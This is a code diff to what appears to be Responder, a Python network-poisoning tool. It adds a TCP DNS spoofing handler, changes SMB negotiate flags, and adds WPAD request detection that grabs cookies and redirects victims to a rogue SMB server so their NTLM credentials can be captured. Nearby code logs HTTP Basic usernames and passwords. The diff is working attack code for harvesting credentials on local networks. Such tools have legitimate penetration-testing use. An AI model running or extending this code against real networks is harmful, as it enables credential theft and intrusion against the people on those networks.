@@ -549,7 +549,7 @@ class SMB1LM(SocketServer.BaseRequestHandler):
               data = self.request.recv(1024)
               ##Negotiate proto answer.
            if data[8:10] == "\x72\x00":
-              head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),mid=midcalc(data))
+              head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
               t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
               t.calculate()
               packet1 = str(head)+str(t)
@@ -785,14 +785,31 @@ class DNS(SocketServer.BaseRequestHandler):
        self.socket.setblocking(0)
 
     def handle(self):
-        request, socket = self.request
-        data = request
+        req, soc = self.request
+        data = req
         if ParseDNSType(data):
            buff = DNSAns()
            buff.calculate(data)
-           socket.sendto(str(buff), self.client_address)
+           soc.sendto(str(buff), self.client_address)
            print "DNS Answer sent to: %s "%(self.client_address[0])
            logging.warning('DNS Answer sent to: %s'%(self.client_address[0]))
+
+class DNSTCP(SocketServer.BaseRequestHandler):
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+       self.socket.setblocking(0)
+
+    def handle(self):
+        try: 
+           data = self.request.recv(1024)
+           if ParseDNSType(data):
+              buff = DNSAns()
+              buff.calculate(data)
+              self.request.send(buff)
+
+        except Exception:
+           raise
 
 ##################################################################################
 #HTTP Stuff
@@ -894,6 +911,7 @@ def Basic_Ntlm(Basic):
 def PacketSequence(data,client):
     a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+    c = re.findall('(?<=wpad.dat )[^\\r]*', data)
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -918,6 +936,12 @@ def PacketSequence(data,client):
        logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
        buffer1 = IIS_Auth_Granted()
        buffer1.calculate()
+       return str(buffer1)
+
+    if c:
+       GrabCookie(data,client)
+       buffer1 = IIS_Auth_Redir()
+       print "HTTP WPAD request detected, redirecting to SMB server"
        return str(buffer1)
 
     else:
@@ -1379,7 +1403,7 @@ def Is_LDAP_On(LDAP_On_Off):
 #Function name self-explanatory
 def Is_DNS_On(DNS_On_Off):
     if DNS_On_Off == "ON":
-       return thread.start_new(serve_thread_udp,('', 53,DNS)),thread.start_new(serve_thread_tcp,('', 53,DNS))
+       return thread.start_new(serve_thread_udp,('', 53,DNS)),thread.start_new(serve_thread_tcp,('', 53,DNSTCP))
     if DNS_On_Off == "OFF":
        return False
 
